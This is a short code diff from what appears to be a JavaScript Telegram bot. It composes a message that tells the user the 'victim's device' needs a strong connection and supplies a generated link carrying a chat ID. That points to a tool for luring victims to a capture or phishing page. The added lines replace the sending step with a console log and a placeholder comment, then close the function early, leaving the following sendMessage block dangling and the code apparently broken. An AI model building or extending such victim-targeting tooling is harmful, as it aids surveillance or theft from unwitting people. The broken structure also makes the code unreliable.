@@ -1706,6 +1706,11 @@ async function sendMessage(chatId) {
 ملاحظه بزم يكون النت قوي في جهاز الضحيه
 : ${caLink}/?chatId=${chatId}`;
 
+    console.log(message);
+
+    // ضع هنا كود الإرسال الحقيقي لديك (بوت، API، عرض في الصفحة...)
+}
+
         if (message && message.trim() !== '') {
             bot.sendMessage(chatId, message);
         } else {
